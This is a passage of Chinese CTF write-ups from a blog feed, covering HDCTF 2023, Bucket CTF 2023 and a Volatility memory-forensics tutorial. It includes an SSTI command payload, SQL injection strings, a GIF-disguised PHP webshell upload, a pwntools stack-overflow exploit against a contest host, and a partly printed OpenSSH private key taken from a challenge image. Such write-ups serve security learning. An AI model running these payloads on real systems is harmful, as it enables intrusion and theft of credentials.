class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs 1c">from Crypto.Util.number import *<br><span class="hljs-meta">#from shin import flag</span><br><br><br>m=bytes_to_long(b&#x27;HDCTF&#123;******&#125;&#x27;)<br>e=<span class="hljs-number">65537</span><br>p=getPrime(<span class="hljs-number">256</span>)<br>q=getPrime(<span class="hljs-number">512</span>)<br>r=getPrime(<span class="hljs-number">512</span>)<br>n=p*q*r<br>P=<span class="hljs-built_in">pow</span>(p,<span class="hljs-number">2</span>,n)<br>Q=<span class="hljs-built_in">pow</span>(q,<span class="hljs-number">2</span>,n)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>print(f<span class="hljs-string">&quot;P = &#123;P&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;Q = &#123;Q&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;n = &#123;n&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;c = &#123;c&#125;&quot;</span>)<br>&#x27;&#x27;&#x27;<br>P = <span class="hljs-number">87602103743628</span><span class="hljs-number">48654680470219</span><span class="hljs-number">30996225069780</span><span class="hljs-number">83349430360494</span><span class="hljs-number">50523139299289</span><span class="hljs-number">45131156330752</span><span class="hljs-number">46471928309096</span><span class="hljs-number">10600414977679</span><span class="hljs-number">14698031460212</span><span class="hljs-number">49631057727807</span><span class="hljs-number">82771611415961</span><br>Q = <span class="hljs-number">11292216403905</span><span class="hljs-number">99001998892017</span><span class="hljs-number">85103245191294</span><span class="hljs-number">29215375106571</span><span class="hljs-number">95574171341112</span><span class="hljs-number">70255457254419</span><span class="hljs-number">54222699179112</span><span class="hljs-number">65719326034947</span><span class="hljs-number">83040069250074</span><span class="hljs-number">26544778496293</span><span class="hljs-number">02547879079782</span><span class="hljs-number">86600866688977</span><span class="hljs-number">26172338853139</span><span class="hljs-number">41284773381173</span><span class="hljs-number">84319760669476</span><span class="hljs-number">85350617978367</span><span class="hljs-number">49577917101096</span><span class="hljs-number">94089037373611</span><span class="hljs-number">51608926781707</span><span class="hljs-number">48636852474402</span><span class="hljs-number">04926676748540</span><span class="hljs-number">11058417282140</span>1<br>n = <span class="hljs-number">12260605124589</span><span class="hljs-number">73669989677223</span><span class="hljs-number">63161467086815</span><span class="hljs-number">43140877060257</span><span class="hljs-number">85975778940760</span><span class="hljs-number">31374094277716</span><span class="hljs-number">51536724218984</span><span class="hljs-number">02365268019320</span><span class="hljs-number">80199394515394</span><span class="hljs-number">27781667333168</span><span class="hljs-number">26780160348492</span><span class="hljs-number">15165262971365</span><span class="hljs-number">07792965087544</span><span class="hljs-number">39591227194425</span><span class="hljs-number">75350878771121</span><span class="hljs-number">72195116066600</span><span class="hljs-number">14152044446616</span><span class="hljs-number">50906549431924</span><span class="hljs-number">37314974202605</span><span class="hljs-number">81765087483888</span><span class="hljs-number">70652608351453</span><span class="hljs-number">10202223862370</span><span class="hljs-number">94238507996028</span><span class="hljs-number">47611501980338</span><span class="hljs-number">10408432423049</span><span class="hljs-number">42315516153707</span><span class="hljs-number">24277025122111</span><span class="hljs-number">22538749</span><br>c = <span class="hljs-number">70721376513892</span><span class="hljs-number">18220368861685</span><span class="hljs-number">87140005141284</span><span class="hljs-number">90067843534158</span><span class="hljs-number">43217734634414</span><span class="hljs-number">63315143907150</span><span class="hljs-number">19977289070267</span><span class="hljs-number">71187082554241</span><span class="hljs-number">54814051177833</span><span class="hljs-number">98256782959709</span><span class="hljs-number">01188560688120</span><span class="hljs-number">35173277401357</span><span class="hljs-number">54397389883146</span><span class="hljs-number">65372544333857</span><span class="hljs-number">25254889589696</span><span class="hljs-number">89386035085675</span><span class="hljs-number">09519521067106</span><span class="hljs-number">46294734182046</span><span class="hljs-number">23815845770742</span><span class="hljs-number">92318137318996</span><span class="hljs-number">95831288930702</span><span class="hljs-number">41819258088177</span><span class="hljs-number">92124688476198</span><span class="hljs-number">83707955120438</span><span class="hljs-number">80557762094414</span><span class="hljs-number">29996815747449</span><span class="hljs-number">81554616337130</span><span class="hljs-number">096378</span>5<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>import gmpy2<br><span class="hljs-attribute">e</span>=65537<br>P = 8760210374362848654680470219309962250697808334943036049450523139299289451311563307524647192830909610600414977679146980314602124963105772780782771611415961<br>Q = 112922164039059900199889201785103245191294292153751065719557417134111270255457254419542226991791126571932603494783040069250074265447784962930254787907978286600866688977261723388531394128477338117384319760669476853506179783674957791710109694089037373611516089267817074863685247440204926676748540110584172821401<br>n = 12260605124589736699896772236316146708681543140877060257859757789407603137409427771651536724218984023652680193208019939451539427781667333168267801603484921516526297136507792965087544395912271944257535087877112172195116066600141520444466165090654943192437314974202605817650874838887065260835145310202223862370942385079960284761150198033810408432423049423155161537072427702512211122538749<br>c = 7072137651389218220368861685871400051412849006784353415843217734634414633151439071501997728907026771187082554241548140511778339825678295970901188560688120351732774013575439738988314665372544333857252548895896968938603508567509519521067106462947341820462381584577074292318137318996958312889307024181925808817792124688476198837079551204388055776209441429996815747449815546163371300963785<br>p,<span class="hljs-attribute">s</span>=gmpy2.iroot(P,2)<br>q,<span class="hljs-attribute">s</span>=gmpy2.iroot(Q,2)<br><span class="hljs-attribute">r</span>=n//(p*q)<br>phi=(p-1)*(q-1)*(r-1)<br><span class="hljs-attribute">d</span>=gmpy2.invert(e,phi)<br><span class="hljs-attribute">m</span>=pow(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;HDCTF&#123;08c66aa2-f8ea-49a2-a84f-ab9c7999ebb2&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h3><p>zsteg嗦<br><img src="/mdimg/HDCTF2023/5.png"><br><img src="/mdimg/HDCTF2023/6.png"></p><h3 id="ExtremeMisc"><a href="#ExtremeMisc" class="headerlink" title="ExtremeMisc"></a>ExtremeMisc</h3><p>binwalk分离出压缩包<br>爆破密码为<code>haida</code><br>解出来得到双字节逆序的zip<br><a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br><code>python FileReverse-Tools.py -re Reverse.piz</code><br>得到逆序好的zip，改后缀为.zip<br>继续爆破得到密码<code>9724</code><br>secret.zip里的文件没密码里面是secret.txt，另一个压缩包里也有，对比crc32相同，明文攻击<br><img src="/mdimg/HDCTF2023/7.png"><br><code>NSSCTF&#123;u_a_a_master_@_c0mpRe553d_PaCKe1s&#125;</code></p><h3 id="MasterMisc"><a href="#MasterMisc" class="headerlink" title="MasterMisc"></a>MasterMisc</h3><p>合并压缩包：linux：<code>cat *.001 *.002 *.003 *.004 *.005 *.006 &gt; x.zip</code><br>爆破密码：5483<br>解压得到：<br><img src="/mdimg/HDCTF2023/8.png"><br><img src="/mdimg/HDCTF2023/9.png"><br>看图片提示010打开找flag3<br>foremost分离<br>得到一个图片一个音频<br>图片爆破长宽高<br><img src="/mdimg/HDCTF2023/10.png"><br>得到flag2<br>音频：<br>看频谱图<br><img src="/mdimg/HDCTF2023/11.png"><br>得到flag1<br><code> HDCTF&#123;e67d8104-7536-4433-bfff-96759901c405&#125;  </code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h3><p><img src="/mdimg/HDCTF2023/12.png"><br>jsfuck直接控制台<br><img src="/mdimg/HDCTF2023/13.png"></p><h3 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h3><p><img src="/mdimg/HDCTF2023/14.png"><br>………….<br>post一个data，ssti<br>payload：<code>data=&#123;if system(&#39;cat /f*&#39;)&#125;&#123;/if&#125;</code><br><img src="/mdimg/HDCTF2023/15.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h3 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h3><p>upx脱壳<br><code>upx -d file</code><br>ida打开看main函数数里有base64字符串，解密就行</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h3 id="pwnner"><a href="#pwnner" class="headerlink" title="pwnner"></a>pwnner</h3><p>随机数预测+栈溢出<br>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pwnner&#x27;)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>x = remote(<span class="hljs-string">&#x27;node6.anna.nssctf.cn&#x27;</span>,28888)<br>x.recvuntil(<span class="hljs-string">&#x27;you should prove that you love pwn,so input your name:&#x27;</span>)<br>x.send(b<span class="hljs-string">&#x27;1956681178&#x27;</span>)<br>payload = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*64</span>+b<span class="hljs-string">&#x27;b&#x27;</span><span class="hljs-number">*8</span>+p64(0x4008b2)<br>x.send(payload)<br>x.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bucket CTF 2023-wp</title>
    <link href="/2023/04/18/Bucket%20CTF%202023/"/>
    <url>/2023/04/18/Bucket%20CTF%202023/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="sqli1"><a href="#sqli1" class="headerlink" title="sqli1"></a>sqli1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><h3 id="sqli2"><a href="#sqli2" class="headerlink" title="sqli2"></a>sqli2</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><h3 id="sqli3"><a href="#sqli3" class="headerlink" title="sqli3"></a>sqli3</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Finally! I moved the secret into a <strong>COMPLETELY</strong> different table. There is <strong>NO</strong> way you can find it now.</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>sqlmap:<br><img src="/mdimg/Bucket2023/1.png"></p><h3 id="Ping-check"><a href="#Ping-check" class="headerlink" title="Ping check"></a>Ping check</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>WEB<br>EASY<br>Did you know that this CTF is run on <a href="https://github.com/EmergencyBucket/pail">custom built open source software</a>? Note: The flag is not in the usual bucket{} format.<br>Do not overthink.<br>You don’t need to go to any other page.</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目说明里有网站源码：<a href="https://github.com/EmergencyBucket/pail">https://github.com/EmergencyBucket/pail</a><br><img src="/mdimg/Bucket2023/2.png"></p><h3 id="Gif"><a href="#Gif" class="headerlink" title="Gif"></a>Gif</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>I made a <strong>secure</strong> php web app where I can upload all my gifs. Some people on the internet told me to run it in a docker container just to protect it from my personal files, but who cares.</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/Bucket2023/3.png"><br>看他的表单提交，接收2个参数，文件名，和文件<br><img src="/mdimg/Bucket2023/4.png"><br>需要加个gif的magic header <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a><br><img src="/mdimg/Bucket2023/5.png"><br><img src="/mdimg/Bucket2023/6.png"><br>貌似不能eval，直接system执行命令可以<br><img src="/mdimg/Bucket2023/7.png"><br><img src="/mdimg/Bucket2023/8.png"></p><h3 id="sqli4"><a href="#sqli4" class="headerlink" title="sqli4"></a>sqli4</h3><p>貌似和3一样<br><img src="/mdimg/Bucket2023/9.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Apps"><a href="#Apps" class="headerlink" title="Apps"></a>Apps</h3><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/Bucket2023/10.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="minecraft"><a href="#minecraft" class="headerlink" title="minecraft"></a>minecraft</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/Bucket2023/11.png"></p><h3 id="Discord"><a href="#Discord" class="headerlink" title="Discord"></a>Discord</h3><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路:"></a>解题思路:</h4><p><img src="/mdimg/Bucket2023/12.png"></p><h3 id="Transmission"><a href="#Transmission" class="headerlink" title="Transmission"></a>Transmission</h3><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/Bucket2023/13.png"></p><h3 id="P-clocks"><a href="#P-clocks" class="headerlink" title="P  clocks"></a>P  clocks</h3><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tshark -r clocks_medium.pcap -T fields -e frame.time_delta | <span class="hljs-built_in">cut</span> -c3-3 | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;15&#x27;</span> <span class="hljs-string">&#x27;01&#x27;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> | <span class="hljs-built_in">cut</span> -c2- | perl -lpe <span class="hljs-string">&#x27;$_=pack&quot;B*&quot;,$_&#x27;</span></span><br>bucket&#123;look_at_the_times_sometimes&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存取证</title>
    <link href="/2023/02/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <url>/2023/02/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚接触这个板块不久，也做了几道题，这里把题合并，记录一下<br>volatility2 是python2的，volatility3是python3的，刚开始做的第一题是volatility3做的，但是做到后面题发现有些题vol3是不管用的，dump不下来文件，用vol就可以，反正kali里有py2和py3的环境，我干脆两个混着用了<br>但是个人感觉vol2的功能比较全而且稳定方便<br>最后，以下所有的内容都是我亲身经历，所有不一定所有的变量都一样，安装或者操作与我有误差还得去看看其他师傅的文章呢</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>kali更新之后环境有变化，下面的安装不一定能成功，还请自行百度（</p><h2 id="vol3"><a href="#vol3" class="headerlink" title="vol3"></a>vol3</h2><p> volatility3  下载安装：<br>kali：<br><code>git clone [https://github.com/volatilityfoundation/volatility3.git](https://github.com/volatilityfoundation/volatility3.git)</code><br>此时桌面生成一个文件夹，cd到文件夹<br><code>pip3 install -r requirements-minimal.txt</code><br><code>pip3 install -r requirements.txt</code><br>下载下面这个字符集<br><a href="https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip">https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip</a><br>然后解压后放到symbols目录下<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1.png"><br>然后执行<br><code>python3 setup.py build </code><br><code>python3 setup.py install</code><br>然后安装环境requirements.txt报错时<br><code>sudo apt install libsnappy-dev </code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/2.png"><br>安装成功</p><h2 id="vol2"><a href="#vol2" class="headerlink" title="vol2"></a>vol2</h2><p>vol的安装就比较ez了<br><a href="https://blog.csdn.net/qq_38603541/article/details/129244112">kali下安装Volatility_kali安装volatility_烟雨天青色的博客-CSDN博客</a><br>跟着这个就行了</p><p>记得在root下安装</p><h1 id="前置姿势"><a href="#前置姿势" class="headerlink" title="前置姿势"></a>前置姿势</h1><ul><li><p>官方教程：<a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html</a></p></li><li><p>PowerShell历史命令文件路径为：<code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> ，所以我们直接去filescan<code>ConsoleHost_history.txt</code></p></li><li><p>配合grep命令检索关键字</p></li><li><p>配合strings转换</p></li><li><p>一些文件修复姿势，遇到时百度</p><h2 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h2></li><li><p>vol3要在root用户下运行，不然可能会报错，我就是报错了，重装了还是一样，后来在root运行就可以了</p></li><li><p>vol2最好在根目录运行，我在桌面运行所有命令回显的都是info信息</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="vol3-1"><a href="#vol3-1" class="headerlink" title="vol3"></a>vol3</h3><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><br><br>常用插件：<br>layerwriter：列出内存镜像<span class="hljs-keyword">platform</span>信息<br>linux.bash：从内存中恢复bash命令历史记录<br>linux.check_afinfo：验证网络协议的操作功能指针<br>linux.check_syscall：检查系统调用表中的挂钩<br>linux.elfs：列出所有进程的所有内存映射ELF文件<br>linux.lsmod：列出加载的内核模块<br>linux.lsof：列出所有进程的所有内存映射<br>linux.malfind：列出可能包含注入代码的进程内存范围<br>linux.<span class="hljs-keyword">proc</span>：列出所有进程的所有内存映射<br>linux.pslist：列出linux内存映像中存在的进程<br>linux.pstree：列出进程树<br>mac.bash：从内存中恢复bash命令历史记录<br>mac.check_syscall：检查系统调用表中的挂钩<br>mac.check_sysctl：检查sysctl处理程序的挂钩<br>mac.check_trap_table：检查trap表中的挂钩<br>mac.ifconfig：列出网卡信息<br>mac.lsmod：列出加载的内核模块<br>mac.lsof：列出所有进程的所有内存映射<br>mac.malfind：列出可能包含注入代码的进程内存范围<br>mac.netstat：列出所有进程的所有网络连接<br>mac.psaux：恢复程序命令行参数<br>mac.pslist：列出linux内存映像中存在的进程<br>mac.pstree：列出进程树<br>mac.tasks：列出Mac内存映像中存在的进程<br>windows.<span class="hljs-keyword">info</span>：显示正在分析的内存样本的OS和内核详细信息<br>windows.callbacks：列出内核回调和通知例程<br>windows.cmdline：列出进程命令行参数<br>windows.dlldump：将进程内存范围DLL转储<br>windows.dlllist：列出Windows内存映像中已加载的dll模块<br>windows.driverirp：在Windows内存映像中列出驱动程序的IRP<br>windows.driverscan：扫描Windows内存映像中存在的驱动程序<br>windows.filescan：扫描Windows内存映像中存在的文件对象<br>windows.handles：列出进程打开的句柄<br>windows.malfind：列出可能包含注入代码的进程内存范围<br>windows.moddump：转储内核模块<br>windows.modscan：扫描Windows内存映像中存在的模块<br>windows.mutantscan：扫描Windows内存映像中存在的互斥锁<br>windows.pslist：列出Windows内存映像中存在的进程<br>windows.psscan：扫描Windows内存映像中存在的进程<br>windows.pstree：列出进程树<br>windows.procdump：转储处理可执行映像<br>windows.<span class="hljs-keyword">registry</span>.certificates：列出注册表中存储的证书<br>windows.<span class="hljs-keyword">registry</span>.hivelist：列出内存映像中存在的注册表配置单元<br>windows.<span class="hljs-keyword">registry</span>.hivescan：扫描Windows内存映像中存在的注册表配置单元<br>windows.<span class="hljs-keyword">registry</span>.printkey：在配置单元或特定键值下列出注册表项<br>windows.<span class="hljs-keyword">registry</span>.userassist：打印用户助手注册表项和信息<br>windows.ssdt：列出系统调用表<br>windows.strings：读取字符串命令的输出，并指示每个字符串属于哪个进程<br>windows.svcscan：扫描Windows服务<br>windows.symlinkscan：扫描Windows内存映像中存在的链接<br></code></pre></td></tr></table></figure></li></ul><h3 id="vol2-1"><a href="#vol2-1" class="headerlink" title="vol2"></a>vol2</h3><p>vol要<code>--profile</code>指定版本，所以这里的命令就统一了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus">volatility <span class="hljs-selector-attr">[plugin]</span> -f <span class="hljs-selector-attr">[image]</span> <span class="hljs-attr">--profile</span>=<span class="hljs-selector-attr">[profile]</span><br> <br>常用插件：<br>    imageinfo：显示目标镜像的摘要信息<br>    pslist：列举出系统进程，但它不能检测到隐藏或者解链的进程<br>    psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程<br>    pstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程<br>    mendump：转储指定进程数据，常用foremost来分离里面的文件<br>    filescan：扫描所有的文件列表<br>    dumpfiles：转储文件<br>    svcscan：扫描 Windows 的服务<br>    connscan：查看网络连接<br>    hivelist：打印注册表列表<br>    hivedump：转储注册表信息<br>    printkey：打印注册表项、子项和值<br>    screenshot：Windows截图<br>    hashdump：查看当前操作系统中的password hash，例如Windows的NTLM hash<br>iehistory：查看ie浏览器记录<br>lsadump：从注册表获取用户哈希的部分<br></code></pre></td></tr></table></figure><p><strong>命令太多，可以–info来查看所有可以用的插件</strong></p><h1 id="一些题目wp"><a href="#一些题目wp" class="headerlink" title="一些题目wp"></a>一些题目wp</h1><h2 id="羊城杯-2021-Baby-Forenisc"><a href="#羊城杯-2021-Baby-Forenisc" class="headerlink" title="[羊城杯 2021]Baby_Forenisc"></a>[羊城杯 2021]Baby_Forenisc</h2><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/3.png"><br>这里有一个小坑，要在根目录运行命令，我在桌面运行所有命令回显的都是info信息<br><code>volatility -f /home/kali/桌面/BIODOG-7711E93C-20210908-053022.raw --profile=WinXPSP2x86 iehistory</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/4.png"><br>找ssh文件<br><code>volatility -f /home/kali/桌面/BIODOG-7711E93C-20210908-053022.raw --profile=WinXPSP2x86 filescan |grep &#39;ssh.txt&#39;</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/5.png"><br>dump下来<br><code>volatility -f /home/kali/桌面/BIODOG-7711E93C-20210908-053022.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000020bf6a0 -D /home/kali/桌面</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs awk">-----<span class="hljs-keyword">BEGIN</span> OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAmw8eqi/h23ABuRhhmx83LuRhw6m8C8k76Me0s7MNdvDP2ZB5hJUU<br>fZ4HxR5sEoQf6NyIcCDeznb8FAYAktm3cBlgof847aL661F0R5FtIfOJC/MwklRmXjYr46<br><span class="hljs-number">6</span>HNjQ0Ouu12znqBPJAaMkAaZXknqlEAxCRvyOQhg0bPSR3xxCM39TxpXRKd3tzhlBUQHZi<br>upgt6CF3TkBuIcKUPgZ7OgJ<span class="hljs-regexp">/7ES3FaiUOlpZdUYf/</span>H3VwwQumuXPPwvT5QdRA9Myv/zbee<br>R9ddLJL84raHK6unuHjngGvWjhXUUQulta49HH55pyrFUViIvH1tfns/<span class="hljs-number">6</span>BglTrYWRlFX3A<br>TNOVy2igHkhZI8M9GK5VUBwEo3kXcWRiK85vAWwmddBd9+c0NERahRg+SNbodsd1JFu0C9<br>kqJ8<span class="hljs-regexp">/HlOnDfPBsUpD0EY/</span>EbzW5PKbkksp2Vp3z+S0y1aVpX2EJRhq2S5kEEU+V4LLN6uqu<br>CJzVLeG5Lpnn4V<span class="hljs-regexp">/Ekf/</span>ZpJmmk1Pp9KGFw3tlOqTLAAAFkNMuPgLTLj4CAAAAB3NzaC1yc2<br>EAAAGBAJsPHqov4dtwAbkYYZsfNy7kYcOpvAvJO+jHtLOzDXbwz9mQeYSVFH2eB8UebBKE<br>H+jciHAg3s52<span class="hljs-regexp">/BQGAJLZt3AZYKH/</span>OO2i+utRdEeRbSHziQvzMJJUZl42K+OuhzY0NDrrtd<br>s56gTyQGjJAGmV5J6pRAMQkb8jkIYNGz0kd8cQjN/U8aV0Snd7c4ZQVEB2YrqYLeghd05A<br>biHClD4GezoCf+xEtxWolDpaWXVGH<span class="hljs-regexp">/x91cMELprlzz8L0+UHUQPTMr/</span><span class="hljs-number">823</span>nkfXXSyS/OK2<br>hyurp7h454Br1o4V1FELpbWuPRx+eacqxVFYiLx9bX57P+gYJU62FkZRV9wEzTlctooB5I<br>WSPDPRiuVVAcBKN5F3FkYivObwFsJnXQXffnNDREWoUYPkjW6HbHdSRbtAvZKifPx5Tpw3<br>zwbFKQ9BGPxG81uTym5JLKdlad8/ktMtWlaV9hCUYatkuZBBFPleCyzerqrgic1S3huS6Z<br><span 